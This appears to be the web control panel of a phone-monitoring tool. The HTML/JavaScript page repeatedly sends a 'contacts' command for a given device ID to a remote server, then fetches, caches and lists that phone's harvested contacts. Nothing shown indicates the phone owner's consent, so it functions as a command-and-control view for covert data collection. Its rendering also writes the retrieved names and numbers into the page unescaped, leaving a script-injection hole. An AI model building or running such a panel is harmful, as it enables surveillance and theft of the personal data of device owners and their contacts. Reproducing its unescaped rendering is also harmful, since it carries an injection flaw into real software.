<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contacts - Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #000000;
            --card-bg: #1c1c1e;
            --text-main: #ffffff;
            --text-muted: #8e8e93;
            --border-color: #38383a;
            --accent-green: #30d158;
            --blue-accent: #0b84ff;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0; padding: 0;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 500px;
            background: #000;
            min-height: 100vh;
            padding-bottom: 20px;
        }

        /* --- Header --- */
        .header {
            position: sticky; top: 0;
            background: rgba(0, 0, 0, 0.95);
            backdrop-filter: blur(10px);
            z-index: 100;
            padding: 15px;
            border-bottom: 0.5px solid var(--border-color);
        }

        .top-row {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 10px;
        }

        .page-title { font-size: 1.5rem; font-weight: 700; }
        
        .live-indicator {
            font-size: 0.75rem; color: var(--accent-green);
            display: flex; align-items: center; gap: 5px;
            background: rgba(48, 209, 88, 0.15);
            padding: 4px 10px; border-radius: 20px;
            font-weight: 600;
        }

        .blink { animation: blinker 1.5s linear infinite; }
        @keyframes blinker { 50% { opacity: 0.4; } }

        .back-btn {
            color: var(--blue-accent); font-size: 1rem; text-decoration: none;
            display: flex; align-items: center; gap: 5px;
        }

        /* --- Search --- */
        .search-box { position: relative; margin-top: 5px; }
        
        .search-input {
            width: 100%;
            background: #1c1c1e; /* Match iOS search bar */
            border: none;
            padding: 10px 35px;
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            box-sizing: border-box;
            outline: none;
        }
        .search-icon {
            position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
            color: var(--text-muted); font-size: 0.9rem;
        }

        /* --- Contact List --- */
        .contact-list {
            display: flex; flex-direction: column;
            padding: 0 15px;
        }

        .contact-card {
            background: var(--card-bg);
            padding: 15px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .contact-card:first-child { border-top-left-radius: 12px; border-top-right-radius: 12px; }
        .contact-card:last-child { border-bottom-left-radius: 12px; border-bottom-right-radius: 12px; border-bottom: none; }

        .contact-info { display: flex; flex-direction: column; gap: 4px; }
        
        .contact-name { font-size: 1rem; font-weight: 600; color: #fff; }
        .contact-number { font-size: 0.85rem; color: var(--text-muted); }

        .action-btn {
            color: var(--blue-accent);
            font-size: 1.2rem;
            padding: 10px;
            text-decoration: none;
        }

        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; font-size: 0.9rem; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="top-row">
                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i> Back</a>
                <span class="page-title">Contacts</span>
                <div class="live-indicator"><i class="fa-solid fa-circle blink"></i> Live</div>
            </div>
            
            <div class="search-box">
                <i class="fa-solid fa-magnifying-glass search-icon"></i>
                <input type="text" id="searchInput" class="search-input" placeholder="Search name or number..." onkeyup="filterContacts()">
            </div>
        </div>

        <div id="contact-list" class="contact-list">
            <div class="status-msg">
                <i class="fa-solid fa-spinner fa-spin"></i><br><br>Loading Contacts...
            </div>
        </div>
    </div>

<script>
    const SERVER_URL = "https://child-v9no.onrender.com";
    const urlParams = new URLSearchParams(window.location.search);
    const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
    const storageKeyContacts = `contacts_${DEVICE_ID}`;

    let allContacts = [];
    let isFetching = false;

    document.addEventListener("DOMContentLoaded", function() {
        if (!DEVICE_ID) {
            document.getElementById("contact-list").innerHTML = '<div class="status-msg" style="color:red">Error: No Device ID Found</div>';
            return;
        }

        // Load cached data first
        const savedData = localStorage.getItem(storageKeyContacts);
        if (savedData) {
            try {
                allContacts = JSON.parse(savedData);
                renderContacts(allContacts);
            } catch(e) {}
        }

        startLiveSystem();
    });

    function startLiveSystem() {
        sendCommand(); // Ask phone to update contacts
        fetchContacts(); // Fetch from server
        
        // Contacts don't change often, so we update slower
        setInterval(sendCommand, 20000); 
        setInterval(fetchContacts, 5000);
    }

    function sendCommand() {
        fetch(`${SERVER_URL}/api/send-command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' }) // Command 'contacts' check karein
        }).catch(e => console.log("Command error:", e));
    }

    function fetchContacts() {
        if(isFetching) return;
        isFetching = true;

        // URL check: Ensure endpoint is correct (/contacts)
        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`)
            .then(res => {
                if(!res.ok) throw new Error("Server Error: " + res.status);
                return res.json();
            })
            .then(data => {
                if (data && Array.isArray(data) && data.length > 0) {
                    // Check if data changed
                    if (JSON.stringify(data) !== JSON.stringify(allContacts)) {
                        allContacts = data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
                        localStorage.setItem(storageKeyContacts, JSON.stringify(allContacts));
                        
                        const query = document.getElementById('searchInput').value;
                        if(query === "") renderContacts(allContacts);
                        else filterContacts();
                    }
                } else if (!allContacts.length) {
                    document.getElementById("contact-list").innerHTML = '<div class="status-msg">No contacts found on device.</div>';
                }
            })
            .catch(err => {
                console.error("Fetch Error:", err);
                if(allContacts.length === 0) {
                    document.getElementById("contact-list").innerHTML = `<div class="status-msg" style="color:red">Connection Failed.<br><small>${err.message}</small></div>`;
                }
            })
            .finally(() => { isFetching = false; });
    }

    function filterContacts() {
        const query = document.getElementById('searchInput').value.toLowerCase();
        const filtered = allContacts.filter(c => {
            const name = String(c.name || "").toLowerCase();
            const num = String(c.number || "").toLowerCase();
            return name.includes(query) || num.includes(query);
        });
        renderContacts(filtered);
    }

    function renderContacts(data) {
        const listContainer = document.getElementById("contact-list");
        
        if (!data || data.length === 0) {
            listContainer.innerHTML = '<div class="status-msg">No contacts found.</div>';
            return;
        }

        // Prevent heavy rendering
        const displayData = data.slice(0, 200);

        const htmlString = displayData.map(c => {
            const name = c.name || "Unknown";
            const number = c.number || "";
            
            // Generate Avatar Initials
            const initial = name.charAt(0).toUpperCase();

            return `
                <div class="contact-card">
                    <div style="display:flex; align-items:center; gap:12px;">
                        <div style="width:40px; height:40px; background:#333; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; color:#fff;">
                            ${initial}
                        </div>
                        <div class="contact-info">
                            <span class="contact-name">${name}</span>
                            <span class="contact-number">${number}</span>
                        </div>
                    </div>
                    <a href="tel:${number}" class="action-btn"><i class="fa-solid fa-phone"></i></a>
                </div>
            `;
        }).join('');

        listContainer.innerHTML = htmlString;
    }
</script>
</body>
</html>
